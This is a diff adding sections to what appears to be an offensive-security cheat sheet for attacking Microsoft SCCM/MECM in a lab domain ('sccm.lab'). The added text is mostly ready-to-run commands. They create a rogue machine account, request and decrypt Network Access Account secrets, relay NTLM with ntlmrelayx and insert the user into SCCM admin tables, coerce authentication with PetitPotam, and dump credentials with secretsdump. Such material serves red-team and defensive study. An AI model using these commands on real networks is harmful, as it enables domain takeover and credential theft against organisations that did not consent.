@@ -120,10 +120,19 @@
 
 Create a machine or compromise an existing one, then request policies such as `NAAConfig`
 
-```ps1
-SharpSCCM get secrets -u <username-machine-$> -p <password>
-SharpSCCM get naa
-```
+Easy mode using `SharpSCCM`
+
+    ```ps1
+    SharpSCCM get secrets -u <username-machine-$> -p <password>
+    SharpSCCM get naa
+    ```
+
+Stealthy mode by creating a computer.
+
+* Create a machine account with a specific password: `addcomputer.py -computer-name 'customsccm$' -computer-pass 'YourStrongPassword123*' 'sccm.lab/carol:SCCMftw' -dc-ip 192.168.33.10`
+* In your `/etc/hosts` file, add an entry for the MECM server: `192.168.33.11 MECM MECM.SCCM.LAB`
+* Use `sccmwtf` to request a policy: `python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\customsccm$' 'YourStrongPassword123*'`
+* Parse the policy to extract the credentials and decrypt them using [sccmwtf/policysecretunobfuscate.py](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py): `cat /tmp/naapolicy.xml |grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5 |grep -e 'CDATA' | cut -d '[' -f 3|cut -d ']' -f 1| xargs -I {} python3 policysecretunobfuscate.py {}`
 
 
 ### CRED-3 Extract currently deployed credentials stored as DPAPI blobs
@@ -221,6 +230,38 @@ From a remote machine.
     ```ps1
     SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> /module:query /command:"SELECT * FROM SC_UserAccount"
     sccmdecryptpoc.exe 0C010000080[...]5D6F0
+    ```
+
+
+## SCCM Relay
+
+### TAKEOVER1 - Low Privileges to Database Administrator - MSSQL relay
+
+**Requirements**:
+
+- Database separated from the site server
+- Server site is sysadmin of the database
+
+**Exploitation**:
+
+* Generate the query to elevate our user: `python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked`
+* Setup a relay with the generated query: `ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"`
+* Coerce an authentication to your listener using a domain account: `petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11`
+* Finally, connect as admin on the MSSQL server: `python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11 `
+
+
+### TAKEOVER2 - Low Privileges to MECM Admin Account - SMB relay
+
+Microsoft requires the site server's computer account to be an administrator on the MSSQL server.
+
+**Exploitation**:
+
+* Start a listener for the MSSQL Server: `ntlmrelayx -t 192.168.33.12 -smb2support -socks`
+* Coerce an authentication from the Site Server using domain credentials (low privileges SCCM NAA retrieved on the same machine works great): `petitpotam.py -d sccm.lab -u sccm-naa -p 123456789 192.168.33.1 192.168.33.11`
+* Finally use the SOCKS from `ntlmrelayx` to access the MSSQL server as a local administrator
+    ```ps1
+    proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
+    proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
     ```
 
 
